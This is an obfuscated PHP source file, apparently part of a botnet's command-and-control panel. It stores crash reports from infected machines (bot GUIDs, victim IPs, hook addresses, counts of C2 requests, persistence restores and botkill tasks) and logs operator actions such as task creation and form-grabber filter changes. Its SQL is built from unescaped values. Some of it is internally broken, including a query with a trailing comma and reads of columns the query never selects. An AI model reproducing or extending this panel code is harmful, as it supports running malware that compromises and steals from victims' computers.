        $_obfuscated_0D0C3F0D1C1B26111D26363D13062E2D394025133C3722_ = time() - 84600 * 7;
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_ = "SELECT\r\n\t\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".debug_info WHERE ClientStatus " . $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'total_count',\r\n\t\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".debug_info WHERE ClientStatus " . $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ . " AND msg_date > " . $_obfuscated_0D0B26150F3724040F150F5C2D3423291F1005190D0111_ . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'count_24h',\r\n\t\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".debug_info WHERE ClientStatus " . $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ . " AND msg_date > " . $_obfuscated_0D0C3F0D1C1B26111D26363D13062E2D394025133C3722_ . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'count_7d',\r\n\t\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".debug_info WHERE ClientStatus " . $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ . " AND OS & " . WINDOWS_VERSION_W8 . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'count_w8',\r\n\t\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".debug_info WHERE ClientStatus " . $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ . " AND OS & " . WINDOWS_VERSION_W7 . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'count_w7',\r\n\t\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".debug_info WHERE ClientStatus " . $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ . " AND OS & " . WINDOWS_VERSION_VS . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'count_vista',\r\n\t\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".debug_info WHERE ClientStatus " . $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ . " AND OS & " . WINDOWS_VERSION_XP . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'count_xp',\r\n\t\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".debug_info WHERE ClientStatus " . $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ . " AND OS & " . WINDOWS_VERSION_BIT_32 . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'count_x86',\r\n\t\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".debug_info WHERE ClientStatus " . $_obfuscated_0D14341F1E2309061A0133103314061F2C3931230C2A01_ . " AND OS & " . WINDOWS_VERSION_BIT_64 . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'count_x64',\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t";
        $result = parent::Query($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_);
        if ($result && ($row = mysql_fetch_assoc($result))) {
            $_obfuscated_0D26171B154005140F2F233E3D363E272717313F2F3C22_ = $row["ie7"];
            $_obfuscated_0D38232717341611100316343D5C2B251F210117343911_ = $row["ie8"];
            $_obfuscated_0D02242510282C2B040F3821163C1A2719283D330C2C32_ = $row["ie9"];
            $_obfuscated_0D21371B395C220B3608112D0C24013D04363528282C01_ = $row["ie10"];
            $_obfuscated_0D182C02121F291C36180136293B303F3D0206121C0322_ = $row["ie11"];
            $_obfuscated_0D051F142B081A1D2704363523075B1D3703390A1E1201_ = $row["ieOther"];
            return true;
        }
    }
    public function AddCrashReport()
    {
        $_obfuscated_0D243E1D2516172905023C2B04132E3F3C161A3E1F2F11_ = sprintf("%u", ip2long($_SERVER["REMOTE_ADDR"]));
        $_obfuscated_0D11402C223D051B0A120F140C5C1B320727291D2C4011_ = sprintf("%u", $this->dwFlags);
        $_obfuscated_0D18373D140F3D5B5B231A2E2215322622362A40240111_ = sprintf("%u", $this->ulSystemTime);
        $_obfuscated_0D5C390D0A2F0C1931110C2C2E2E1F30110E0D13102822_ = sprintf("%u", $this->dwOSFlags);
        $_obfuscated_0D14212C0E1F1C4033231F10305B2F3921232C19362111_ = sprintf("%u", $this->pvNtdllBaseAddress);
        $_obfuscated_0D142E23030912332235210421063F3C07251531341522_ = sprintf("%u", $this->pvKernel32BaseAddress);
        $_obfuscated_0D2E2B3F1F13343C052E02291A1C2B2C07312410163E22_ = sprintf("%u", $this->pvUser32BaseAddress);
        $_obfuscated_0D0F2B011D280337393B0D1B5B231D2B021F0414322B32_ = sprintf("%u", $this->pvAdvapi32BaseAddress);
        $_obfuscated_0D375C1F16343D3B0E3D14181B32140C330A0F32030E01_ = sprintf("%u", $this->pvWininetBaseAddress);
        $_obfuscated_0D262627152B3E301E12131529081E343804050D371801_ = sprintf("%u", $this->pvWs2_32BaseAddress);
        $_obfuscated_0D050D2B3D0819152A23311E12131201122A5C01191C01_ = sprintf("%u", $this->pvCrypt32BaseAddress);
        $_obfuscated_0D04212E3D2201361636092626181217010D34265B1532_ = sprintf("%u", $this->Secur32BaseAddress);
        $_obfuscated_0D11070E0702133F362A2510173F020B1021190E233522_ = sprintf("%u", $this->dwProcessId);
        $_obfuscated_0D3F140A21010C1E1805231D391C01172E2A0C375B3711_ = sprintf("%u", $this->dwThreadId);
        $_obfuscated_0D5C292832210E0E2C1E0A19232E152D1B2C3D0F020B11_ = sprintf("%u", $this->dwThreadLastError);
        $_obfuscated_0D10051A2205223D3D164022281702293714110A133401_ = sprintf("%u", $this->dwHooks);
        $_obfuscated_0D291E0C1E190C0113190C014003392107160E103E3901_ = sprintf("%u", $this->pvBaseAddress);
        $_obfuscated_0D3B3C3F2B4015042B36053C3919211027062521352301_ = sprintf("%u", $this->uBotImageSize);
        $_obfuscated_0D01212D170C012F010E32063C1C3E112C2B1908261F22_ = sprintf("%u", $this->pvHookCustomNtCallsBaseAddress);
        $_obfuscated_0D5C24171613113235110B1D1D2C10031F161C1E1E2E22_ = sprintf("%u", $this->pvHookSavedCodeBaseAddress);
        $_obfuscated_0D1C0E0A3423280A3535260F2E24142D1B3D1C1A5C0F22_ = bin2hex($this->szProcessName);
        $_obfuscated_0D030524332A5B33165B250E3C2F1240010E273F1B0F01_ = sprintf("%u", $this->dwBotInitStatus);
        $_obfuscated_0D181B352D3C10162A2614393137022C132B3511030411_ = sprintf("%u", $this->lNumActiveC2Requests);
        $_obfuscated_0D081221212F2926082A245B37150207041A0C290E1532_ = sprintf("%u", $this->lNumberOfPersistFileRestores);
        $_obfuscated_0D37213B5B352D3D01033125232B1B1E3B2A34222D0722_ = sprintf("%u", $this->lNumberOfActiveDownloadTasks);
        $_obfuscated_0D1D27160E111317310D350127313B0F093D0C07251E32_ = sprintf("%u", $this->lNumberOfActiveBotkillTasks);
        $_obfuscated_0D06111E275C1131142C1C1E32360E38105C36341E3C01_ = sprintf("%u", $this->Context_Dr0);
        $_obfuscated_0D15312612122F0F061A22245C0E0A28230B0E37061C32_ = sprintf("%u", $this->Context_Dr1);
        $_obfuscated_0D2A27100B34042F06113734153B0C1027370B122E0811_ = sprintf("%u", $this->Context_Dr2);
        $_obfuscated_0D27043C283B142636121C1B17100E373639303E233C32_ = sprintf("%u", $this->Context_Dr3);
        $_obfuscated_0D0419231024335C1330132D072637020B1E1A050B0501_ = sprintf("%u", $this->Context_Dr6);
        $_obfuscated_0D27020D240D0D13372711382807071E34091240112822_ = sprintf("%u", $this->Context_Dr7);
        $_obfuscated_0D155B1824210127035C18323F05340F18123B12221B11_ = sprintf("%u", $this->Context_Edi);
        $_obfuscated_0D0233061E2D2A1C0605301E40300E291E3D1D273D0411_ = sprintf("%u", $this->Context_Esi);
        $_obfuscated_0D13061614391C2128142C1D265C023F1F3324092D2701_ = sprintf("%u", $this->Context_Ebx);
        $_obfuscated_0D031F3B0333372A2C2E3D2123272823032506013D3732_ = sprintf("%u", $this->Context_Edx);
        $_obfuscated_0D03133B2F2B050F061F24041B092E103B18353C372732_ = sprintf("%u", $this->Context_Ecx);
        $_obfuscated_0D31093B33231C301507050A130F2A31355B011D392111_ = sprintf("%u", $this->Context_Eax);
        $_obfuscated_0D393935042C0E5C4033332F2F2E3F0A212B10070C1D32_ = sprintf("%u", $this->Context_Ebp);
        $_obfuscated_0D38285B0F131434190B3C0802392D1C0C283738181F11_ = sprintf("%u", $this->Context_Eip);
        $_obfuscated_0D090D332433361F0B32312D1F1E18073413393F0B0301_ = sprintf("%u", $this->Context_Esp);
        $_obfuscated_0D081D313125261A0C230F1A185C041517251E2B072632_ = bin2hex($this->szEip_ModuleName);
        $_obfuscated_0D182D5B3F0D242526391F1313145B0F3B1B322B191C11_ = sprintf("%u", $this->dwNumberOfNestedExceptions);
        $_obfuscated_0D2836222737392B37393C260C083623280F1223034011_ = bin2hex($this->szExceptionModuleName);
        $_obfuscated_0D0B3D2F3D3326053535152B17042A0135402826111C32_ = sprintf("%u", $this->Record_ExceptionCode);
        $_obfuscated_0D1B400B073D2A380523071B2917341532221C0D041101_ = sprintf("%u", $this->Record_ExceptionFlags);
        $_obfuscated_0D170B28302A0627183C0F293923062C38092B37032401_ = sprintf("%u", $this->Record_ExceptionAddress);
        $_obfuscated_0D0609301A28070B0F212D19260732041F2B1E36231232_ = sprintf("%u", $this->Record_NumberParameters);
        $_obfuscated_0D0D240312341934231B5B0C15342718041D2431132932_ = sprintf("%u", $this->Record_ExParam1);
        $_obfuscated_0D40023906400118280D0533330B070E3B2D22112E1532_ = sprintf("%u", $this->Record_ExParam2);
        $_obfuscated_0D331A1340020A0902220C393C0B123C163525035C0C11_ = sprintf("%u", $this->Record_ExParam3);
        $_obfuscated_0D07262D041D180B10233C1A1D1F402A1B3418210C2B32_ = sprintf("%u", $this->Record_ExParam4);
        $_obfuscated_0D223515052611311439380A03131A1C2D16160A262211_ = sprintf("%u", $this->Record_ExParam5);
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ = "INSERT INTO " . $this->pdbname . ".debug_crash_reports VALUES(";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "NULL, ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $this->szBotGUID . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "'" . $this->szGroupName . "', ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D243E1D2516172905023C2B04132E3F3C161A3E1F2F11_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D5C390D0A2F0C1931110C2C2E2E1F30110E0D13102822_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D11402C223D051B0A120F140C5C1B320727291D2C4011_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D18373D140F3D5B5B231A2E2215322622362A40240111_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNIX_TIMESTAMP(NOW()), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D14212C0E1F1C4033231F10305B2F3921232C19362111_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D142E23030912332235210421063F3C07251531341522_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D2E2B3F1F13343C052E02291A1C2B2C07312410163E22_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0F2B011D280337393B0D1B5B231D2B021F0414322B32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D375C1F16343D3B0E3D14181B32140C330A0F32030E01_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D262627152B3E301E12131529081E343804050D371801_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D050D2B3D0819152A23311E12131201122A5C01191C01_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D04212E3D2201361636092626181217010D34265B1532_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D11070E0702133F362A2510173F020B1021190E233522_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D3F140A21010C1E1805231D391C01172E2A0C375B3711_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D5C292832210E0E2C1E0A19232E152D1B2C3D0F020B11_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D10051A2205223D3D164022281702293714110A133401_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D181B352D3C10162A2614393137022C132B3511030411_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D37213B5B352D3D01033125232B1B1E3B2A34222D0722_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D1D27160E111317310D350127313B0F093D0C07251E32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D081221212F2926082A245B37150207041A0C290E1532_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D291E0C1E190C0113190C014003392107160E103E3901_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D3B3C3F2B4015042B36053C3919211027062521352301_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D01212D170C012F010E32063C1C3E112C2B1908261F22_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D5C24171613113235110B1D1D2C10031F161C1E1E2E22_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D030524332A5B33165B250E3C2F1240010E273F1B0F01_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D1C0E0A3423280A3535260F2E24142D1B3D1C1A5C0F22_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D081D313125261A0C230F1A185C041517251E2B072632_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D2836222737392B37393C260C083623280F1223034011_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D06111E275C1131142C1C1E32360E38105C36341E3C01_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D15312612122F0F061A22245C0E0A28230B0E37061C32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D2A27100B34042F06113734153B0C1027370B122E0811_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D27043C283B142636121C1B17100E373639303E233C32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0419231024335C1330132D072637020B1E1A050B0501_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D27020D240D0D13372711382807071E34091240112822_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D155B1824210127035C18323F05340F18123B12221B11_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0233061E2D2A1C0605301E40300E291E3D1D273D0411_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D13061614391C2128142C1D265C023F1F3324092D2701_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D031F3B0333372A2C2E3D2123272823032506013D3732_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D03133B2F2B050F061F24041B092E103B18353C372732_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D31093B33231C301507050A130F2A31355B011D392111_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D393935042C0E5C4033332F2F2E3F0A212B10070C1D32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D38285B0F131434190B3C0802392D1C0C283738181F11_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D090D332433361F0B32312D1F1E18073413393F0B0301_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $this->Record_ExceptionCode . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D1B400B073D2A380523071B2917341532221C0D041101_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D170B28302A0627183C0F293923062C38092B37032401_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0609301A28070B0F212D19260732041F2B1E36231232_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0D240312341934231B5B0C15342718041D2431132932_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D40023906400118280D0533330B070E3B2D22112E1532_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D331A1340020A0902220C393C0B123C163525035C0C11_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D07262D041D180B10233C1A1D1F402A1B3418210C2B32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D223515052611311439380A03131A1C2D16160A262211_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D182D5B3F0D242526391F1313145B0F3B1B322B191C11_;
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= ")";
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query($_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_);
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            return true;
        }
        return false;
    }
}
class CLogs extends CSqlWrap
{
    public function AddEvent($username, $event_type, $ex_data)
    {
        return $this->AddEventEx($username, $event_type, $_SERVER["REMOTE_ADDR"], $ex_data, time(), $_obfuscated_0D0814072F291C31362528380D111F1E210E18312D0401_);
    }
    public function AddEventEx($username, $event_type, $ip_addr, $extended_data, $creation_date)
    {
        $username = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($username);
        $extended_data = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($extended_data);
        $event_type = (int) $event_type;
        $_obfuscated_0D3619361A1E1B0F2C0124090E23111B332B0530192811_ = explode(".", $ip_addr);
        global $sqlSettings;
        if (!($sqlSettings->LogOptions & EVENT_OPTION_ENABLED)) {
            return NULL;
        }
        if (!($sqlSettings->LogOptions & EVENT_OPTION_E_LOGINS) && $event_type == EVENT_TYPE_LOGIN) {
            return NULL;
        }
        if (!($sqlSettings->LogOptions & EVENT_OPTION_E_SETTINGS) && $event_type == EVENT_TYPE_SETTINGS_CHANGE) {
            return NULL;
        }
        if (!($sqlSettings->LogOptions & EVENT_OPTION_E_TASKS) && $event_type == EVENT_TYPE_NEW_TASK) {
            return NULL;
        }
        if (!($sqlSettings->LogOptions & EVENT_OPTION_E_USERS) && $event_type == EVENT_TYPE_USER_CREATION) {
            return NULL;
        }
        if ($sqlSettings->LogOptions & EVENT_OPTION_MASK_IPS) {
            $_obfuscated_0D3414240C291D0539343202121D383F2B2D0208042811_ = $_obfuscated_0D3619361A1E1B0F2C0124090E23111B332B0530192811_[0] . "." . $_obfuscated_0D3619361A1E1B0F2C0124090E23111B332B0530192811_[1] . ".x.x";
        } else {
            $_obfuscated_0D3414240C291D0539343202121D383F2B2D0208042811_ = $ip_addr;
        }
        $_obfuscated_0D3414240C291D0539343202121D383F2B2D0208042811_ = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($_obfuscated_0D3414240C291D0539343202121D383F2B2D0208042811_);
        return parent::Query("INSERT INTO " . $this->pdbname . ".exlogs VALUES(NULL, '" . $event_type . "', '" . $username . "', '" . $_obfuscated_0D3414240C291D0539343202121D383F2B2D0208042811_ . "', '" . $extended_data . "', '" . $creation_date . "')");
    }
    public function EventTypeToString($event_type)
    {
        switch ($event_type) {
            case EVENT_TYPE_LOGIN:
                return "Successful login";
            case EVENT_TYPE_SETTINGS_CHANGE:
                return "Panel settings changed";
            case EVENT_TYPE_NEW_TASK:
                return "New task created";
            case EVENT_TYPE_USER_CREATION:
                return "New user created";
            case EVENT_TYPE_UNKNOWN:
                return "Unknown event type";
            case EVENT_TYPE_USER_MODIFIED:
                return "User modified";
            case EVENT_TYPE_TASK_EDIT:
                return "Task edited";
            case EVENT_TYPE_TASK_DELETE:
                return "Task deleted";
            case EVENT_TYPE_DB_WIPED_RECORDS:
                return "Database action";
            case EVENT_TYPE_FORMS_MODIFIED_FILTERS:
                return "FG filters modified";
            case EVENT_TYPE_GRABBER_STATUS_CHANGED:
                return "Grabber status change";
            case EVENT_TYPE_FILE_SEARCH_UPDATED:
                return "FS config changed";
        }
        return "";
    }
    public function ClearLogs()
    {
        return parent::Query("TRUNCATE TABLE " . $this->pdbname . ".exlogs;");
    }
}

?>